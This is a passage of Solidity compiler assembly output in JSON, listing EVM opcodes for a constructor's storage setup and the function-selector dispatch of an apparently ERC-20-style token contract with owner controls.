									"end": 600,
									"name": "POP"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH [tag]",
									"value": "11"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMP"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "tag",
									"value": "8"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPDEST"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP3"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SLOAD"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP2"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "AND"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "ISZERO"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "MUL"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SUB"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "AND"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "2"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DIV"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "MSTORE"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "KECCAK256"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "1F"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "ADD"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DIV"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP2"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "ADD"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP3"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP3"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "1F"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "LT"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH [tag]",
									"value": "13"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPI"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "MLOAD"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "FF"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "NOT"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "AND"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP4"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "ADD"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "OR"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP6"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SSTORE"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH [tag]",
									"value": "12"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMP"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "tag",
									"value": "13"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPDEST"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP3"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "ADD"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "ADD"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP6"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SSTORE"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP3"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "ISZERO"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH [tag]",
									"value": "12"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPI"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP2"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP3"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "ADD"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "tag",
									"value": "14"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPDEST"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP3"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP2"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "GT"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "ISZERO"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH [tag]",
									"value": "15"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPI"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP3"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "MLOAD"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP3"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SSTORE"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP2"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "ADD"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP2"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "ADD"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH [tag]",
									"value": "14"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMP"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "tag",
									"value": "15"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPDEST"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "tag",
									"value": "12"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPDEST"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "POP"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "POP"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH [tag]",
									"value": "16"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP2"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH [tag]",
									"value": "17"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMP",
									"value": "[in]"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "tag",
									"value": "16"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPDEST"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "POP"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMP",
									"value": "[out]"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "tag",
									"value": "17"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPDEST"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH [tag]",
									"value": "18"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP2"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "tag",
									"value": "19"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPDEST"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP3"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "GT"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "ISZERO"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH [tag]",
									"value": "20"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPI"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP2"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SSTORE"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "POP"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "ADD"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH [tag]",
									"value": "19"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMP"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "tag",
									"value": "20"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPDEST"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "POP"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMP"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "tag",
									"value": "18"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPDEST"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "SWAP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMP",
									"value": "[out]"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "tag",
									"value": "11"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "JUMPDEST"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "DUP1"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "CODECOPY"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a723158208a5b76c8858b2d6e2432ab0b438bfa09edfb8008eeb9e7a4d545404dc600ee6d64736f6c63430005110032",
									".code": [
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "MSTORE"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "LT"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "SHR"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "8DA5CB5B"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "GT"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "30"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "B2BDFA7B"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "GT"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "31"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "DD62ED3E"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "GT"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "32"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "DD62ED3E"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "E4849B32"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "27"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "F2FDE38B"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "F83D08BA"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMP"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "tag",
											"value": "32"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPDEST"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "B2BDFA7B"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "23"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "C03646BA"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "24"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "D56B2889"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMP"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "tag",
											"value": "31"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPDEST"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "A457C2D7"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "GT"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "33"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "A457C2D7"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "A69DF4B5"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "A6F2AE3A"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "A9059CBB"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMP"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "tag",
											"value": "33"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPDEST"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "8DA5CB5B"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "95D89B41"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "A348C289"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMP"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "tag",
											"value": "30"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPDEST"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "41702014"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "GT"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "34"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "645B8B1B"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "GT"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "35"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "645B8B1B"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "6E63CD96"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "715018A6"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMP"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "tag",
											"value": "35"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPDEST"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "41702014"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "51EC819F"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "62A09477"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMP"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "tag",
											"value": "34"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPDEST"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "1C87E971"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "GT"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "36"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "1C87E971"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "23B872DD"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "313CE567"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "39509351"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMP"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "tag",
											"value": "36"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPDEST"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "6FDDE03"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "95EA7B3"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "18160DDD"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "EQ"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPI"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "JUMPDEST"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "DUP1"
										},
										{
											"begin": 2509,
											"end": 5232,
											"name": "REVERT"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "JUMPDEST"
